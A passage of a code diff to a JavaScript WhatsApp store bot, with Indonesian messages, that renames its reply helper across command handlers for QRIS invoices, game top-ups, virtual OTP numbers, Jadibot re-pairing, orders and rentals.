             `│ Invoice: ${result.payment?.merchantRef || '-'}\n` +
@@ -10470,29 +10443,29 @@ case 'batalpurchaseqris': {
             `${cleanup.failed ? '⚠️ Penghapusan QRIS tidak bisa dikonfirmasi sepenuhnya. Jangan gunakan QR lama; hubungi owner jika pesan masih terlihat.' : `✅ Pesan QRIS/control berhasil dihapus (${cleanup.deleted} pesan).`} Jika gateway melaporkan pembayaran terlambat, nominal akan diamankan ke saldo bot dan produk tidak akan dibuat otomatis.`
         )
     } catch (error) {
-        return Reply(`❌ Order QRIS tidak dapat dibatalkan: ${error?.message || error}\n\nGunakan ${prefix}purchaseqrisstatus untuk mengecek status invoice dan jangan membuat order duplikat.`)
+        return replyV1(`❌ Order QRIS tidak dapat dibatalkan: ${error?.message || error}\n\nGunakan ${prefix}purchaseqrisstatus untuk mengecek status invoice dan jangan membuat order duplikat.`)
     }
 }
 break
 case 'purchaseqrisstatus': {
     const ref = String(args[0] || '').trim()
-    if (!ref) return Reply(`Contoh: ${prefix}purchaseqrisstatus INVOICE`) 
+    if (!ref) return replyV1(`Contoh: ${prefix}purchaseqrisstatus INVOICE`) 
     try {
         const before = depositService.get(ref)
-        if (!before || String(before.kind || '').toUpperCase() === 'DEPOSIT') return Reply('❌ Invoice pembelian tidak ditemukan.')
-        if (before.jid !== m.sender && !isOwner) return Reply('❌ Invoice ini bukan milik akun kamu.')
+        if (!before || String(before.kind || '').toUpperCase() === 'DEPOSIT') return replyV1('❌ Invoice pembelian tidak ditemukan.')
+        if (before.jid !== m.sender && !isOwner) return replyV1('❌ Invoice ini bukan milik akun kamu.')
         const tx = await depositService.check(ref)
-        return Reply(`╭─〔 📲 STATUS QRIS PEMBELIAN 〕\n║ Invoice : ${tx.merchantRef}\n║ Produk  : ${tx.items?.[0]?.name || '-'}\n║ Nominal : Rp${depositService.formatMoney(tx.totalPay || tx.amount)}\n║ Status  : ${tx.status}\n║ Fulfill : ${tx.handlerProcessedAt ? 'SELESAI' : tx.fulfillmentPaused ? 'BUTUH PEMERIKSAAN OWNER' : 'DIPROSES OTOMATIS'}\n╰────────────────\n\nPembayaran ini adalah invoice pembelian langsung, bukan deposit saldo bot.`)
-    } catch (error) { return Reply(`❌ Gagal cek invoice: ${error?.message || error}`) }
+        return replyV1(`╭─〔 📲 STATUS QRIS PEMBELIAN 〕\n║ Invoice : ${tx.merchantRef}\n║ Produk  : ${tx.items?.[0]?.name || '-'}\n║ Nominal : Rp${depositService.formatMoney(tx.totalPay || tx.amount)}\n║ Status  : ${tx.status}\n║ Fulfill : ${tx.handlerProcessedAt ? 'SELESAI' : tx.fulfillmentPaused ? 'BUTUH PEMERIKSAAN OWNER' : 'DIPROSES OTOMATIS'}\n╰────────────────\n\nPembayaran ini adalah invoice pembelian langsung, bukan deposit saldo bot.`)
+    } catch (error) { return replyV1(`❌ Gagal cek invoice: ${error?.message || error}`) }
 }
 break
 case 'topupdiag': {
-    if (!isCreator) return Reply(mess.owner)
+    if (!isCreator) return replyV1(mess.owner)
     try {
         const info = await topupService.diagnose()
         const balance = info?.balance ?? info?.saldo ?? 0
         const status = info?.status ?? 'OK'
-        return Reply(
+        return replyV1(
             `╭─〔 🔎 VIPAYMENT DIAGNOSTIC 〕\n` +
             `║ Status : *${String(status)}*\n` +
             `║ Saldo  : *Rp${topupService.formatMoney(balance)}*\n` +
@@ -10500,7 +10473,7 @@ case 'topupdiag': {
             `Endpoint profile VIPayment berhasil diautentikasi.`
         )
     } catch (e) {
-        return Reply(`❌ VIPayment diagnostic gagal: ${e?.message || e}`)
+        return replyV1(`❌ VIPayment diagnostic gagal: ${e?.message || e}`)
     }
 }
 break
@@ -10523,10 +10496,10 @@ case 'topupprices': {
             fallbackText: `Pilih game: ${prefix}cekharga ff, ${prefix}cekharga ml, atau ${prefix}cekharga roblox.`
         })
     }
-    if (!['ff', 'ml', 'roblox'].includes(game)) return Reply('Game yang tersedia: ff, ml, roblox')
+    if (!['ff', 'ml', 'roblox'].includes(game)) return replyV1('Game yang tersedia: ff, ml, roblox')
     try {
         const list = await topupService.prices(game)
-        if (!list.length) return Reply(`❌ Produk ${game.toUpperCase()} belum tersedia dari provider.`)
+        if (!list.length) return replyV1(`❌ Produk ${game.toUpperCase()} belum tersedia dari provider.`)
 
         const pageSize = 7
         const totalPages = Math.max(1, Math.ceil(list.length / pageSize))
@@ -10568,24 +10541,24 @@ case 'topupprices': {
             fallbackText: `${menuText}\n\n${fallbackLines}`
         })
     } catch (e) {
-        return Reply(`❌ Gagal mengambil harga: ${e?.message || e}`)
+        return replyV1(`❌ Gagal mengambil harga: ${e?.message || e}`)
     }
 }
 
 break
 case 'topupstatus':
 case 'cekstatus': {
-    if (!args[0]) return Reply(`Contoh: ${prefix}topupstatus TPXXXX`)
+    if (!args[0]) return replyV1(`Contoh: ${prefix}topupstatus TPXXXX`)
     try {
         const old = topupService.getTransaction(args[0])
-        if (!old) return Reply('❌ Transaksi tidak ditemukan.')
-        if (old.jid !== m.sender && !isOwner) return Reply('❌ Transaksi ini bukan milik akun kamu.')
+        if (!old) return replyV1('❌ Transaksi tidak ditemukan.')
+        if (old.jid !== m.sender && !isOwner) return replyV1('❌ Transaksi ini bukan milik akun kamu.')
         const tx = await topupService.status(args[0])
         if (['gagal', 'error'].includes(String(tx.status).toLowerCase()) && tx.charged && !tx.refunded) {
             const refunded = await purchasePayment.refundFailedTopup(tx)
             if (refunded?.transaction) Object.assign(tx, refunded.transaction)
         }
-        return Reply(
+        return replyV1(
             `╭─〔 🎮 STATUS TOP UP 〕\n` +
             `║ Ref     : *${tx.ref}*\n` +
             `║ Produk  : *${tx.productName}*\n` +
@@ -10596,7 +10569,7 @@ case 'cekstatus': {
             `╰────────────────\n\n${tx.message || ''}`
         )
     } catch (e) {
-        return Reply(`❌ ${e?.message || e}`)
+        return replyV1(`❌ ${e?.message || e}`)
     }
 }
 break
@@ -10638,7 +10611,7 @@ case 'nokosservices': {
     const page = Math.max(1, Math.floor(Number(args[1]) || 1))
     try {
         const list = await nokosService.services(country)
-        if (!list.length) return Reply(`❌ Service untuk negara ${country} tidak ditemukan. Coba ${prefix}nokosservices <country_id>.`)
+        if (!list.length) return replyV1(`❌ Service untuk negara ${country} tidak ditemukan. Coba ${prefix}nokosservices <country_id>.`)
 
         const pageSize = 7
         const totalPages = Math.max(1, Math.ceil(list.length / pageSize))
@@ -10677,7 +10650,7 @@ case 'nokosservices': {
             fallbackText: `${body}\n\n${fallback}`
         })
     } catch (e) {
-        return Reply(`❌ Gagal mengambil layanan RuangOTP: ${e?.message || e}`)
+        return replyV1(`❌ Gagal mengambil layanan RuangOTP: ${e?.message || e}`)
     }
 }
 
@@ -10687,7 +10660,7 @@ case 'nokosprice': {
     const country = Number(args[1] || global.nokosConfig?.defaultCountry || 6)
     const requestedProvider = String(args[2] || '').trim()
     const page = Math.max(1, Math.floor(Number(args[3]) || 1))
-    if (!service || !Number.isFinite(country) || country <= 0) return Reply(`Contoh: ${prefix}nokosprice wa 6`)
+    if (!service || !Number.isFinite(country) || country <= 0) return replyV1(`Contoh: ${prefix}nokosprice wa 6`)
 
     try {
         const price = await nokosService.getPrice(service, country, requestedProvider && requestedProvider !== '-' ? requestedProvider : null)
@@ -10699,7 +10672,7 @@ case 'nokosprice': {
             : allProviders
         const providers = candidates.filter(provider => Number(provider.cost) > 0 && provider.providerId && (provider.stock == null || Number(provider.stock) > 0))
         if (!providers.length) {
-            return Reply(`❌ Provider yang bisa dipesan tidak ditemukan untuk ${service.toUpperCase()} / negara ${country}. Pastikan provider memiliki ID, harga, dan stok aktif.`)
+            return replyV1(`❌ Provider yang bisa dipesan tidak ditemukan untuk ${service.toUpperCase()} / negara ${country}. Pastikan provider memiliki ID, harga, dan stok aktif.`)
         }
 
         const pageSize = 7
@@ -10746,7 +10719,7 @@ case 'nokosprice': {
             fallbackText: `${body}\n\n${fallback}`
         })
     } catch (e) {
-        return Reply(`❌ Gagal mengambil harga/provider: ${e?.message || e}`)
+        return replyV1(`❌ Gagal mengambil harga/provider: ${e?.message || e}`)
     }
 }
 
@@ -10758,7 +10731,7 @@ case 'nokoscountries': {
     try {
         const list = await nokosService.getCatalog(service)
         if (!list.length) {
-            return Reply(`❌ Daftar negara untuk service ${service.toUpperCase()} kosong dari provider.\n\nGunakan ${prefix}nokosservices untuk memilih service lain.`)
+            return replyV1(`❌ Daftar negara untuk service ${service.toUpperCase()} kosong dari provider.\n\nGunakan ${prefix}nokosservices untuk memilih service lain.`)
         }
 
         const pageSize = 7
@@ -10801,26 +10774,26 @@ case 'nokoscountries': {
             fallbackText: `${body}\n\n${fallback}`
         })
     } catch (e) {
-        return Reply(`❌ Gagal mengambil daftar negara NOKOS: ${e?.message || e}`)
+        return replyV1(`❌ Gagal mengambil daftar negara NOKOS: ${e?.message || e}`)
     }
 }
 
 break
 case 'nokosbalance': {
-    if (!isCreator) return Reply(mess.owner)
-    return Reply('ℹ️ Endpoint saldo RuangOTP tidak tersedia pada integrasi API yang terpasang. Bot tidak mengirim request saldo yang belum didukung/didokumentasikan.')
+    if (!isCreator) return replyV1(mess.owner)
+    return replyV1('ℹ️ Endpoint saldo RuangOTP tidak tersedia pada integrasi API yang terpasang. Bot tidak mengirim request saldo yang belum didukung/didokumentasikan.')
 }
 break
 case 'nokosdiag': {
-    if (!isCreator) return Reply(mess.owner)
+    if (!isCreator) return replyV1(mess.owner)
     try {
         const userId = String(global.nokosConfig?.userId || '').trim()
         const masked = userId.length >= 8 ? `${userId.slice(0, 4)}${'*'.repeat(Math.max(0, userId.length - 8))}${userId.slice(-4)}` : '(kosong)'
-        if (!userId) return Reply('❌ User ID RuangOTP kosong di settings.js. Isi user ID akun RuangOTP yang valid.')
+        if (!userId) return replyV1('❌ User ID RuangOTP kosong di settings.js. Isi user ID akun RuangOTP yang valid.')
         const countries = await nokosService.diagnoseConnection()
-        return Reply(`✅ RuangOTP API siap dipakai\n\n🔑 x-user-id terbaca: ${masked}\n🌍 Negara llist: *${countries.length}*\n🌐 Base URL: *${nokosService.baseUrl()}*\n\n✅ Request langsung berhasil.`)
+        return replyV1(`✅ RuangOTP API siap dipakai\n\n🔑 x-user-id terbaca: ${masked}\n🌍 Negara llist: *${countries.length}*\n🌐 Base URL: *${nokosService.baseUrl()}*\n\n✅ Request langsung berhasil.`)
     } catch (e) {
-        return Reply(`❌ nokos menu gagal: ${e?.message || e}`)
+        return replyV1(`❌ nokos menu gagal: ${e?.message || e}`)
     }
 }
 break
@@ -10829,14 +10802,14 @@ case 'nokosorder': {
     const country = Number(args[1] || global.nokosConfig?.defaultCountry || 6)
     const operator = String(args[2] || 'any').toLowerCase()
     const providerId = String(args[3] || global.nokosConfig?.defaultProviderId || '').trim()
-    if (!service || !Number.isFinite(country) || country <= 0) return Reply(`Contoh: ${prefix}nokosorder wa 6 any [provider_id]`)
-    if (!nokosService.ready()) return Reply('❌ API RuangOTP belum terkonfigurasi. Periksa kredensial di settings.js, x-user-id, dan whitelist IP VPS.')
+    if (!service || !Number.isFinite(country) || country <= 0) return replyV1(`Contoh: ${prefix}nokosorder wa 6 any [provider_id]`)
+    if (!nokosService.ready()) return replyV1('❌ API RuangOTP belum terkonfigurasi. Periksa kredensial di settings.js, x-user-id, dan whitelist IP VPS.')
     try {
         const price = await nokosService.getPrice(service, country, providerId || null, operator)
         const stockKnown = price?.stock != null
-        if (!price || !(Number(price.cost) > 0)) return Reply('❌ Harga/provider untuk service + negara tersebut tidak tersedia.')
-        if (stockKnown && Number(price.stock) <= 0) return Reply('❌ Stok nomor sedang kosong atau layanan tidak tersedia.')
-        if (!price.providerId) return Reply('❌ Provider tidak mengembalikan provider ID. Pesanan tidak dibuat demi mencegah salah order.')
+        if (!price || !(Number(price.cost) > 0)) return replyV1('❌ Harga/provider untuk service + negara tersebut tidak tersedia.')
+        if (stockKnown && Number(price.stock) <= 0) return replyV1('❌ Stok nomor sedang kosong atau layanan tidak tersedia.')
+        if (!price.providerId) return replyV1('❌ Provider tidak mengembalikan provider ID. Pesanan tidak dibuat demi mencegah salah order.')
         const selling = nokosService.sellPrice(price.cost)
         const intent = purchasePayment.createIntent({
             type: 'NOKOS', jid: m.sender, source: 'whatsapp', pushname, amount: selling,
@@ -10845,28 +10818,28 @@ case 'nokosorder': {
         })
         return await sendPurchaseMethodMenu(intent)
     } catch (error) {
-        return Reply(`❌ Gagal menyiapkan order NOKOS: ${error?.message || error}\nBelum ada order provider yang dibuat.`)
+        return replyV1(`❌ Gagal menyiapkan order NOKOS: ${error?.message || error}\nBelum ada order provider yang dibuat.`)
     }
 }
 break
 case 'nokospaybalance': {
     const token = String(args[0] || '').trim().toUpperCase()
-    if (!token) return Reply(`Contoh: ${prefix}nokospaybalance TOKEN`)
+    if (!token) return replyV1(`Contoh: ${prefix}nokospaybalance TOKEN`)
     return handleWaPurchaseBalance(token, 'NOKOS')
 }
 break
 case 'nokospayqris': {
     const token = String(args[0] || '').trim().toUpperCase()
-    if (!token) return Reply(`Contoh: ${prefix}nokospayqris TOKEN`)
+    if (!token) return replyV1(`Contoh: ${prefix}nokospayqris TOKEN`)
     return sendPurchaseQr(token, 'NOKOS')
 }
 break
 case 'nokosstatus': {
     const ref = String(args[0] || '').toUpperCase()
-    if (!ref) return Reply(`Contoh: ${prefix}nokosstatus NOK-XXXX`)
+    if (!ref) return replyV1(`Contoh: ${prefix}nokosstatus NOK-XXXX`)
     const order = nokosService.getOrder(ref)
-    if (!order) return Reply('❌ Order nokos tidak ditemukan.')
-    if (order.jid !== m.sender && !isCreator) return Reply(mess.owner)
+    if (!order) return replyV1('❌ Order nokos tidak ditemukan.')
+    if (order.jid !== m.sender && !isCreator) return replyV1(mess.owner)
     try {
         const providerId = order.providerTransactionId || order.orderId || order.activationId
         const s = await nokosService.status(providerId)
@@ -10879,7 +10852,7 @@ case 'nokosstatus': {
             patch.refunded = Boolean(refund?.order?.refunded || order.refunded)
         }
         const updated = nokosService.updateOrder(ref, patch) || { ...order, ...patch }
-        return Reply(
+        return replyV1(
             `╭─〔 📱 STATUS NOKOS 〕\n` +
             `║ Ref     : *${updated.ref}*\n` +
             `║ Service : *${updated.service}*\n` +
@@ -10891,23 +10864,23 @@ case 'nokosstatus': {
             `╰────────────────\n\n${updated.sms || ''}`
         )
     } catch (e) {
-        return Reply(`❌ Gagal cek status: ${e?.message || e}`)
+        return replyV1(`❌ Gagal cek status: ${e?.message || e}`)
     }
 }
 break
 case 'nokosresend': {
     const ref = String(args[0] || '').trim().toUpperCase()
-    if (!ref) return Reply(`Contoh: ${prefix}nokosresend NOK-XXXX`)
+    if (!ref) return replyV1(`Contoh: ${prefix}nokosresend NOK-XXXX`)
     const order = nokosService.getOrder(ref)
-    if (!order) return Reply('❌ Order nokos tidak ditemukan.')
-    if (order.jid !== m.sender) return Reply('❌ Ref tersebut bukan milik akun kamu.')
+    if (!order) return replyV1('❌ Order nokos tidak ditemukan.')
+    if (order.jid !== m.sender) return replyV1('❌ Ref tersebut bukan milik akun kamu.')
     const providerId = order.providerTransactionId || order.orderId || order.activationId
-    if (!providerId) return Reply('❌ Order tidak memiliki ID transaksi provider.')
-    if (!['waiting', 'wait_code', 'pending', 'processing'].includes(String(order.status || '').toLowerCase())) return Reply(`❌ Resend hanya tersedia saat order menunggu OTP. Status: ${String(order.status).toUpperCase()}`)
+    if (!providerId) return replyV1('❌ Order tidak memiliki ID transaksi provider.')
+    if (!['waiting', 'wait_code', 'pending', 'processing'].includes(String(order.status || '').toLowerCase())) return replyV1(`❌ Resend hanya tersedia saat order menunggu OTP. Status: ${String(order.status).toUpperCase()}`)
     try {
         const result = await nokosService.resend(providerId)
         nokosService.updateOrder(ref, { lastResendAt: Date.now(), resendCount: Number(order.resendCount || 0) + 1, status: 'waiting' })
-        return Reply(
+        return replyV1(
             `✅ *Permintaan resend OTP berhasil dikirim.*\n\n` +
             `Ref: *${ref}*\n` +
             `Nomor: *${order.phone}*\n` +
@@ -10915,24 +10888,24 @@ case 'nokosresend': {
             `Status: *MENUNGGU OTP*`
         )
     } catch (e) {
-        return Reply(`❌ Gagal resend OTP: ${e?.message || e}`)
+        return replyV1(`❌ Gagal resend OTP: ${e?.message || e}`)
     }
 }
 break
 case 'nokoscancel': {
     const ref = String(args[0] || '').toUpperCase()
-    if (!ref) return Reply(`Contoh: ${prefix}nokoscancel NOK-XXXX`)
+    if (!ref) return replyV1(`Contoh: ${prefix}nokoscancel NOK-XXXX`)
     const order = nokosService.getOrder(ref)
-    if (!order) return Reply('❌ Order nokos tidak ditemukan.')
-    if (order.jid !== m.sender && !isCreator) return Reply(mess.owner)
-    if (!['waiting', 'wait_code', 'pending', 'processing', 'cancel_requested'].includes(String(order.status || '').toLowerCase())) return Reply(`❌ Order sudah berstatus *${String(order.status).toUpperCase()}* dan tidak dapat dibatalkan.`)
+    if (!order) return replyV1('❌ Order nokos tidak ditemukan.')
+    if (order.jid !== m.sender && !isCreator) return replyV1(mess.owner)
+    if (!['waiting', 'wait_code', 'pending', 'processing', 'cancel_requested'].includes(String(order.status || '').toLowerCase())) return replyV1(`❌ Order sudah berstatus *${String(order.status).toUpperCase()}* dan tidak dapat dibatalkan.`)
     try {
         const result = await nokosService.cancelOrderAndRefund(ref, 'manual_cancel')
-        if (!result.confirmed) return Reply(`⚠️ Pembatalan belum dapat dikonfirmasi oleh provider. Dana belum direfund dan order tidak dibuat ulang.\nRef: *${ref}*\n${result.message || 'Owner perlu memeriksa status provider.'}\nCek lagi: ${prefix}nokosstatus ${ref}`)
+        if (!result.confirmed) return replyV1(`⚠️ Pembatalan belum dapat dikonfirmasi oleh provider. Dana belum direfund dan order tidak dibuat ulang.\nRef: *${ref}*\n${result.message || 'Owner perlu memeriksa status provider.'}\nCek lagi: ${prefix}nokosstatus ${ref}`)
         const refundAmount = result.refund ? nokosService.money(result.order?.sellingPrice || order.sellingPrice) : '0'
-        return Reply(`✅ Status provider mengonfirmasi order *${ref}* berakhir (*${String(result.status || result.order?.status).toUpperCase()}*).\n💰 Refund saldo bot: *Rp${refundAmount}*\n${result.refund ? 'Refund diproses satu kali.' : 'Tidak ada pemotongan saldo tercatat pada order ini.'}`)
+        return replyV1(`✅ Status provider mengonfirmasi order *${ref}* berakhir (*${String(result.status || result.order?.status).toUpperCase()}*).\n💰 Refund saldo bot: *Rp${refundAmount}*\n${result.refund ? 'Refund diproses satu kali.' : 'Tidak ada pemotongan saldo tercatat pada order ini.'}`)
     } catch (e) {
-        return Reply(`⚠️ Pembatalan belum selesai: ${e?.message || e}\nJangan mengulangi pembelian. Cek ${prefix}nokosstatus ${ref} atau hubungi owner; refund hanya dilakukan setelah status provider terverifikasi.`)
+        return replyV1(`⚠️ Pembatalan belum selesai: ${e?.message || e}\nJangan mengulangi pembelian. Cek ${prefix}nokosstatus ${ref} atau hubungi owner; refund hanya dilakukan setelah status provider terverifikasi.`)
     }
 }
 break
@@ -11042,20 +11015,20 @@ case 'sewastore': {
 
 break
 case 'jadibotrepair': {
-    if (m.isGroup) return Reply('🔐 Gunakan perintah ini melalui chat pribadi bot penjual agar kode pairing tidak terlihat anggota grup.')
+    if (m.isGroup) return replyV1('🔐 Gunakan perintah ini melalui chat pribadi bot penjual agar kode pairing tidak terlihat anggota grup.')
     // Cari sesi berdasarkan semua identitas pengirim yang tersedia di Baileys.
     // Ini penting bila lebih dari satu buyer/sesi terdaftar pada server yang sama.
     const info = jadibotService.getInfo(ownerSenderCandidates)
     if (!info?.ownerJid || String(info.status || '').toUpperCase() !== 'LOGGED_OUT') {
-        return Reply('ℹ️ Tidak ada sesi Jadibot milik akun ini yang perlu dipairing ulang. Perintah ini hanya untuk sesi yang benar-benar dilaporkan logout oleh WhatsApp.')
+        return replyV1('ℹ️ Tidak ada sesi Jadibot milik akun ini yang perlu dipairing ulang. Perintah ini hanya untuk sesi yang benar-benar dilaporkan logout oleh WhatsApp.')
     }
     const canRepair = ownerSenderCandidates.some(sender => ownerIdentityMatches(info.ownerJid, sender))
-    if (!canRepair) return Reply('❌ Perintah ini hanya bisa digunakan oleh akun pembeli/pemilik sesi Jadibot tersebut.')
+    if (!canRepair) return replyV1('❌ Perintah ini hanya bisa digunakan oleh akun pembeli/pemilik sesi Jadibot tersebut.')
     try {
         const result = await jadibotService.repair({ ownerJid: ownerSenderCandidates, orderRef: info.orderRef })
         const code = String(result?.code || '')
-        if (!code) return Reply('⚠️ Sesi mulai dipairing tetapi kode belum tersedia. Tunggu beberapa detik lalu cek status sesi.')
-        return Reply(
+        if (!code) return replyV1('⚠️ Sesi mulai dipairing tetapi kode belum tersedia. Tunggu beberapa detik lalu cek status sesi.')
+        return replyV1(
             `🔐 *PAIRING ULANG JADIBOT*\n\n` +
             `📱 Nomor bot: *${info.phoneNumber || '-'}*\n` +
             `🔑 Kode pairing: *${code}*\n\n` +
@@ -11065,7 +11038,7 @@ case 'jadibotrepair': {
             `Tidak ada order atau pembayaran baru yang dibuat oleh perintah ini. Jangan bagikan kode pairing kepada orang lain.`
         )
     } catch (e) {
-        return Reply(`❌ Gagal memulai pairing ulang: ${e?.message || e}\nTidak ada pembelian baru yang dibuat.`)
+        return replyV1(`❌ Gagal memulai pairing ulang: ${e?.message || e}\nTidak ada pembelian baru yang dibuat.`)
     }
 }
 break
@@ -11085,7 +11058,7 @@ case 'belijadibot': {
     if (['jadibot', 'belijadibot'].includes(command) && !key) return sendStoreProductSelectionMenu('jadibot', 1)
     if (!key) return sendStoreProductSelectionMenu('all', 1)
     const product = storeService.getProduct(key)
-    if (!product) return Reply(`❌ Produk *${key}* tidak ditemukan. Gunakan ${prefix}listproduk.`)
+    if (!product) return replyV1(`❌ Produk *${key}* tidak ditemukan. Gunakan ${prefix}listproduk.`)
     try {
         const created = await storeService.createOrder({ jid: m.sender, productKey: key, pushname })
         let image = null
@@ -11104,7 +11077,7 @@ case 'belijadibot': {
             (created.order.checkoutUrl ? `\n\n🔗 Invoice: ${created.order.checkoutUrl}` : '')
         return sendStoreOrderInteractive(created.order, image, caption)
     } catch (e) {
-        return Reply(`❌ Gagal membuat order: ${e?.message || e}`)
+        return replyV1(`❌ Gagal membuat order: ${e?.message || e}`)
     }
 }
 break
@@ -11113,15 +11086,15 @@ case 'cancelorder':
 case 'batalorder':
 case 'orderbatal': {
     const ref = String(args[0] || '').trim()
-    if (!ref) return Reply(`Contoh: ${prefix}ordercancel ORDXXXX`)
+    if (!ref) return replyV1(`Contoh: ${prefix}ordercancel ORDXXXX`)
     try {
         const before = storeService.getOrder(ref)
-        if (!before) return Reply('❌ Order tidak ditemukan.')
-        if (before.jid !== m.sender && !isOwner) return Reply('❌ Order ini bukan milik kamu.')
+        if (!before) return replyV1('❌ Order tidak ditemukan.')
+        if (before.jid !== m.sender && !isOwner) return replyV1('❌ Order ini bukan milik kamu.')
         const order = await storeService.cancelOrder(ref, m.sender)
         const payment = order.paymentRef ? depositService.get(order.paymentRef) : null
         const cleanup = await deleteStoredQrMessages(payment, order.paymentRef || ref)
-        return Reply(
+        return replyV1(
             `╭─〔 ❌ ORDER DIBATALKAN 〕
 ` +
             `│ 🧾 Referensi: ${order.ref}
@@ -11138,7 +11111,7 @@ case 'orderbatal': {
             `Reservasi stok telah dilepas. ${cleanup.failed ? '⚠️ Penghapusan QRIS tidak dapat dikonfirmasi sepenuhnya; jangan gunakan QR lama dan hubungi owner jika pesan masih terlihat.' : `✅ Pesan QRIS/control berhasil dihapus (${cleanup.deleted} pesan).`} Bila gateway melaporkan pembayaran terlambat setelah pembatalan, nominal akan diamankan ke saldo bot, bukan membuat order baru.`
         )
     } catch (error) {
-        return Reply(`❌ Order tidak dapat dibatalkan: ${error?.message || error}
+        return replyV1(`❌ Order tidak dapat dibatalkan: ${error?.message || error}
 
 Jika pembayaran sudah masuk atau statusnya belum pasti, gunakan ${prefix}orderstatus ${ref} dan jangan membuat order duplikat.`)
     }
@@ -11146,16 +11119,16 @@ Jika pembayaran sudah masuk atau statusnya belum pasti, gunakan ${prefix}orderst
 break
 case 'orderstatus':
 case 'cekorder': {
-    if (!args[0]) return Reply(`Contoh: ${prefix}orderstatus ORDXXXX`)
+    if (!args[0]) return replyV1(`Contoh: ${prefix}orderstatus ORDXXXX`)
     try {
         let order = storeService.getOrder(args[0])
-        if (!order) return Reply('❌ Order tidak ditemukan.')
-        if (order.jid !== m.sender && !isOwner) return Reply('❌ Order ini bukan milik akun kamu.')
+        if (!order) return replyV1('❌ Order tidak ditemukan.')
+        if (order.jid !== m.sender && !isOwner) return replyV1('❌ Order ini bukan milik akun kamu.')
         if (order.paymentRef) {
             await depositService.check(order.paymentRef)
             order = storeService.getOrder(args[0]) || order
         }
-        return Reply(
+        return replyV1(
             `╭─〔 📦 STATUS ORDER 〕\n` +
             `║ Ref      : *${order.ref}*\n` +
             `║ Produk   : *${order.productName}*\n` +
@@ -11165,24 +11138,24 @@ case 'cekorder': {
             `╰────────────────`
         )
     } catch (e) {
-        return Reply(`❌ ${e?.message || e}`)
+        return replyV1(`❌ ${e?.message || e}`)
     }
 }
 break
 case 'proses': {
-    if (!isOwner) return Reply(mess.owner)
-    if (!args[0]) return Reply(`Contoh: ${prefix}proses ORDXXXX`)
+    if (!isOwner) return replyV1(mess.owner)
+    if (!args[0]) return replyV1(`Contoh: ${prefix}proses ORDXXXX`)
     try {
         const order = await storeService.markProcessing(args[0], m.sender)
-        return Reply(`✅ Order *${order.ref}* sekarang berstatus *PROCESSING*.\n\n${order.productType === 'panel' ? `Setelah panel dibuat, gunakan:\n${prefix}paneldone ${order.ref} | URL | USERNAME/EMAIL | PASSWORD` : `Setelah bot siap, gunakan:\n${prefix}aktifsewa ${order.ref}`}`)
+        return replyV1(`✅ Order *${order.ref}* sekarang berstatus *PROCESSING*.\n\n${order.productType === 'panel' ? `Setelah panel dibuat, gunakan:\n${prefix}paneldone ${order.ref} | URL | USERNAME/EMAIL | PASSWORD` : `Setelah bot siap, gunakan:\n${prefix}aktifsewa ${order.ref}`}`)
     } catch (e) {
-        return Reply(`❌ ${e?.message || e}`)
+        return replyV1(`❌ ${e?.message || e}`)
     }
 }
 break
 case 'paneldone': {
-    if (!isOwner) return Reply(mess.owner)
-    if (!args[0]) return Reply(`Contoh: ${prefix}paneldone ORDXXXX | https://panel.domain | user@example.com | Password123`)
+    if (!isOwner) return replyV1(mess.owner)
+    if (!args[0]) return replyV1(`Contoh: ${prefix}paneldone ORDXXXX | https://panel.domain | user@example.com | Password123`)
     const raw = q
     const parts = raw.split('|').map(v => v.trim())
     const ref = parts.shift()
@@ -11192,55 +11165,55 @@ case 'paneldone': {
             username: parts[1],
             password: parts.slice(2).join(' | ')
         })
-        return Reply(`✅ Panel untuk *${order.ref}* sudah dikirim ke customer.`)
+        return replyV1(`✅ Panel untuk *${order.ref}* sudah dikirim ke customer.`)
     } catch (e) {
-        return Reply(`❌ ${e?.message || e}`)
+        return replyV1(`❌ ${e?.message || e}`)
     }
 }
 break
 case 'done': {
-    if (!isOwner) return Reply(mess.owner)
-    if (!args[0]) return Reply(`Contoh panel: ${prefix}done ORDXXXX | URL | USERNAME | PASSWORD\nContoh sewa: ${prefix}done ORDXXXX`)
+    if (!isOwner) return replyV1(mess.owner)
+    if (!args[0]) return replyV1(`Contoh panel: ${prefix}done ORDXXXX | URL | USERNAME | PASSWORD\nContoh sewa: ${prefix}done ORDXXXX`)
     try {
         const order = storeService.getOrder(args[0])
-        if (!order) return Reply('❌ Order tidak ditemukan.')
+        if (!order) return replyV1('❌ Order tidak ditemukan.')
         if (order.productType === 'rental') {
             const rental = await storeService.activateRental(order.ref)
-            return Reply(`✅ Sewa *${rental.id}* aktif sampai *${new Date(rental.expiresAt).toLocaleString('id-ID')}*.`)
+            return replyV1(`✅ Sewa *${rental.id}* aktif sampai *${new Date(rental.expiresAt).toLocaleString('id-ID')}*.`)
         }
         const parts = q.split('|').map(v => v.trim())
         const ref = parts.shift()
         const done = await storeService.finishPanel(ref, { url: parts[0], username: parts[1], password: parts.slice(2).join(' | ') })
-        return Reply(`✅ Order *${done.ref}* selesai dan data panel sudah dikirim.`)
+        return replyV1(`✅ Order *${done.ref}* selesai dan data panel sudah dikirim.`)
     } catch (e) {
-        return Reply(`❌ ${e?.message || e}`)
+        return replyV1(`❌ ${e?.message || e}`)
     }
 }
 break
 case 'aktifsewa':
 case 'mulaisewa': {
-    if (!isOwner) return Reply(mess.owner)
-    if (!args[0]) return Reply(`Contoh: ${prefix}aktifsewa ORDXXXX`)
+    if (!isOwner) return replyV1(mess.owner)
+    if (!args[0]) return replyV1(`Contoh: ${prefix}aktifsewa ORDXXXX`)
     try {
         const rental = await storeService.activateRental(args[0])
-        return Reply(`✅ Sewa aktif.\n🆔 *${rental.id}*\n📅 Expired: *${new Date(rental.expiresAt).toLocaleString('id-ID')}*`)
+        return replyV1(`✅ Sewa aktif.\n🆔 *${rental.id}*\n📅 Expired: *${new Date(rental.expiresAt).toLocaleString('id-ID')}*`)
     } catch (e) {
-        return Reply(`❌ ${e?.message || e}`)
+        return replyV1(`❌ ${e?.message || e}`)
     }
 }
 break
 case 'tambahmasa':
 case 'perpanjangsewa': {
-    if (!isOwner) return Reply(mess.owner)
-    if (!args[0] || !args[1]) return Reply(`Contoh: ${prefix}tambahmasa SEWAXXXX 30d\natau ${prefix}tambahmasa 62812xxxx 30d`)
+    if (!isOwner) return replyV1(mess.owner)
+    if (!args[0] || !args[1]) return replyV1(`Contoh: ${prefix}tambahmasa SEWAXXXX 30d\natau ${prefix}tambahmasa 62812xxxx 30d`)
     try {
         const rental = await storeService.addTime(args[0], args[1])
         if (storeService.getRental(rental.id)) {
             // nothing else; user notification below is intentionally simple
         }
